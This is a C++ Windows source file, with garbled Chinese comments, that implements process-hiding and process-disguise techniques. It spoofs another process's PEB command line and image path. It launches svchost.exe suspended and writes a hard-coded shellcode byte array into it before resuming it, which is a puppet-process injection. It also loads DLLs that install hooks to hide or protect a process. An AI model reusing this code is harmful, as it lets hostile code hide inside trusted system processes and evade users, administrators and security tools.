#include "stdafx.h"
#include "HidePretend.h"

HMODULE g_hModule = NULL;
HHOOK g_hHook = NULL;

HidePretend::HidePretend()
{
}

HidePretend::~HidePretend()
{
}

// ������ʾ
void ShowError(const char* szBuf)
{
	::MessageBoxA(0, szBuf, "������ʾ", 0);
}

// 368���ֽڵ�ShellCode ������������
char MyShellCode[] = \
      "\x60\x83\xEC\x60\xEB\x2E\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C\x00\x4C\x6F\x61\x64" \
      "\x4C\x69\x62\x72\x61\x72\x79\x45\x78\x41\x00\x75\x73\x65\x72\x33\x32\x2E\x64\x6C" \
      "\x6C\x00\x5D\x4E\x33\x96\x53\x90\xBA\x4E\x00\x00\xD9\xEE\xD9\x74\x24\xF4\x5A\x64" \
      "\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x36\x8B\x5E\x08\x68\x85\xDF" \
      "\xAF\xBB\x53\xE8\xB1\x00\x00\x00\x8B\xC8\x51\x52\x8D\x52\xDC\x52\x53\xFF\xD1\x5A" \
      "\x59\x52\x50\x53\xE8\x01\x00\x00\x00\x61\x55\x8B\xEC\x83\xEC\x0C\x8B\x55\x10\x33" \
      "\xC9\x8D\x72\xEB\x51\x51\x56\xFF\x55\x0C\x68\x80\x0A\x38\x1E\x50\xE8\x7C\x00\x00" \
      "\x00\x33\xC9\x8B\x55\x10\x8D\x5A\xF6\x51\x53\x53\x51\xFF\xD0\x8B\x55\x10\x8D\x5A" \
      "\xD2\x33\xC9\x51\x51\x53\xFF\x55\x0C\x68\x6B\xC8\xEB\x09\x50\xE8\x55\x00\x00\x00" \
      "\x33\xC9\x51\xFF\xD0\x8B\xE5\x5D\xC2\x10\x00\xC8\x00\x00\x00\x83\xEC\x04\x53\x51" \
      "\x52\xC7\x45\xFC\x00\x00\x00\x00\x33\xC0\x33\xC9\x8B\x75\x08\x8A\x04\x0E\x84\xC0" \
      "\x74\x16\x8B\x7D\xFC\xC1\xE7\x19\x8B\x55\xFC\xC1\xEA\x07\x0B\xFA\x03\xF8\x89\x7D" \
      "\xFC\x41\xEB\xE3\x8B\x75\x0C\x3B\xFE\xB8\x01\x00\x00\x00\x74\x02\x33\xC0\x5A\x59" \
      "\x5B\xC9\xC2\x08\x00\x55\x8B\xEC\x83\xEC\x0C\x52\x53\x8B\x55\x08\x8B\x72\x3C\x8D" \
      "\x34\x32\x8B\x76\x78\x8D\x34\x32\x8B\x7E\x1C\x8D\x3C\x3A\x89\x7D\xFC\x8B\x7E\x20" \
      "\x8D\x3C\x3A\x89\x7D\xF8\x8B\x7E\x24\x8D\x3C\x3A\x89\x7D\xF4\x33\xC9\xEB\x01\x41" \
      "\x8B\x75\xF8\x8B\x34\x8E\x8D\x34\x32\xFF\x75\x0C\x56\xE8\x6D\xFF\xFF\xFF\x85\xC0" \
      "\x74\xE9\x8B\x75\xF4\x33\xDB\x66\x8B\x1C\x4E\x8B\x75\xFC\x8B\x34\x9E\x8D\x04\x32" \
      "\x5B\x5A\x8B\xE5\x5D\xC2\x08\x00";

// αװ����
void DisguiseProcess(DWORD Pid, LPWSTR szPath, LPWSTR szName)
{
	// �򿪽��̾��
	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
	if (!hProcess)
	{
		ShowError("OpenProcessʧ�ܣ�");
		return;
	}

	MyNtQueryInformationProcess MyNtQIP = NULL;	
	// �ֶ���ntdll.dll�л�ȡNtQueryInformationProcess�����ĵ�ַ
	MyNtQIP = (MyNtQueryInformationProcess)::GetProcAddress(
		LoadLibrary(L"ntdll.dll"), "NtQueryInformationProcess");
	if (!MyNtQIP)
	{
		ShowError("GetProcAddressʧ�ܣ�");
		return;
	}

	PROCESS_BASIC_INFORMATION pbi = {};
	// ��ȡָ�����̵Ļ�����Ϣ
	NTSTATUS status = MyNtQIP(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
	if (!NT_SUCCESS(status))
	{
		ShowError("MyNtQIPʧ�ܣ�");
		return;
	}
		
	PEB peb = {};
	// ��ȡָ�����̵�PebBaseAddress
	::ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), nullptr);

	RTL_USER_PROCESS_PARAMETERS Param = {};
	// ��ȡPEB�е�ProcessParameters
	::ReadProcessMemory(hProcess, peb.ProcessParameters, &Param, sizeof(Param), nullptr);
		
	USHORT usNameLen = 0;
	USHORT usPathLen = 0;
	usNameLen = (::wcslen(szName) + 1) * 2;
	usPathLen = (::wcslen(szPath) + 1) * 2;
	
	// �޸�ָ������PEB����������Ϣ
	::WriteProcessMemory(hProcess, Param.CommandLine.Buffer, szPath, usPathLen, nullptr);
	::WriteProcessMemory(hProcess, &Param.CommandLine.Length, &szPath, sizeof(szPath), nullptr);
	// �޸�·����Ϣ
	::WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, szPath, usPathLen, nullptr);
	::WriteProcessMemory(hProcess, &Param.ImagePathName.Length, &szPath, sizeof(szPath), nullptr);
	
}

// ���ܽ���
void Puppet()
{
#ifndef _WIN64
	BOOL bRet = FALSE;
	STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};
	si.cb = sizeof(STARTUPINFOA);

	CString strPath = L"C:\\windows\\sysWoW64\\svchost.exe";
	
	// �Թ���ʽ��������
	bRet = ::CreateProcess(strPath, nullptr, nullptr, nullptr, FALSE,
		CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);
	if (!bRet)
	{
		ShowError("VirtualAllocEx!");
		return;
	}

	CONTEXT threadContext = { sizeof(CONTEXT) };
	threadContext.ContextFlags = CONTEXT_FULL;
	bRet = ::GetThreadContext(pi.hThread, &threadContext);
	if (!bRet)
	{
		ShowError("GetThreadContext!");
		return;
	}
	   
	// �õ�Ŀ��������߳������ĺ���Ebx�Ĵ����б���ľ���PEB�ĵ�ַ��
	// ��PEB�ṹƫ��0x8��λ����AddressOfImageBase�ֶΣ�
	// ����ֱ������ȡctx.Ebx+0x8���Ϳ��Ի�ȡ��Ŀ����̵ļ��ػ�ַ
	DWORD dwImageBase = 0;		
	SIZE_T lpSize = 0;
	if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(threadContext.Ebx + 0x8), &dwImageBase, sizeof(DWORD), &lpSize))
	{
		ShowError("ReadProcessMemory!");
		return;
	}

	SIZE_T outSize = 0;
	// ���ڴ���д������
	bRet = ::WriteProcessMemory(pi.hProcess, (LPVOID)threadContext.Eax, MyShellCode, sizeof(MyShellCode), &outSize);
	if (!bRet)
	{
		ShowError("WriteProcessMemory!");
		return;
	}

	// �ָ�����Ľ��̵��߳�
	::ResumeThread(pi.hThread);
#endif
}

// ����֮�ҹ�
void HideHook(BOOL IsWho, DWORD dwPid)
{
	// ����DLL����ȡģ���ַ
	if(IsWho)
		g_hModule = ::LoadLibraryA("HideProcessDll.dll");
		//g_hModule = ::LoadLibraryA("D:\\C++��ϰ4\\NewHideDll\\x64\\Debug\\NewHideDll.dll");
	else
	{
		g_hModule = ::LoadLibraryA("ProtectProcessDll.dll");
		DWORD* pdwPid = (DWORD*)::GetProcAddress(g_hModule, "g_dwPid");
		memcpy(pdwPid, &dwPid, sizeof(DWORD));
	}
		
	if (!g_hModule)
	{
		ShowError("����DLLʧ�ܣ�");
		return;			
	}

	// ��ȡ���ù��ӵĺ�����ַ
	typedef HHOOK(*FnSetHook)();
	FnSetHook SetHook = (FnSetHook)::GetProcAddress(g_hModule, "SetHook");
	if (!SetHook)
	{
		ShowError("��ȡSetHook��ַʧ�ܣ�");
		return;
	}

	// ��װ����
	g_hHook = SetHook();
	if (!g_hHook)
	{
		ShowError("����SetHook����ʧ�ܣ�");
		return;
	}
}

// ����֮�ѹ�
void HideUnHook()
{
	if (!g_hModule) return;

	// ��ȡж�ع��ӵĺ�����ַ
	typedef BOOL(*FnUnloadHook)(HHOOK);
	//FnUnloadHook UnloadHook = (FnUnloadHook)::GetProcAddress(g_hModule, "UnsetHook");
	FnUnloadHook UnloadHook = (FnUnloadHook)::GetProcAddress(g_hModule, "UnloadHook");
	if (!UnloadHook)
	{
		ShowError("��ȡUnloadHook��ַʧ�ܣ�");
		FreeLibrary(g_hModule);
		return;
	}

	if (!g_hHook)
	{
		FreeLibrary(g_hModule);
		return;
	}
	
	// ж�ع���
	if (!UnloadHook(g_hHook))
	{
		ShowError("����UnloadHook����ʧ�ܣ�");
		FreeLibrary(g_hModule);
		return;
	}

	// �ͷ�DLL
	FreeLibrary(g_hModule);
}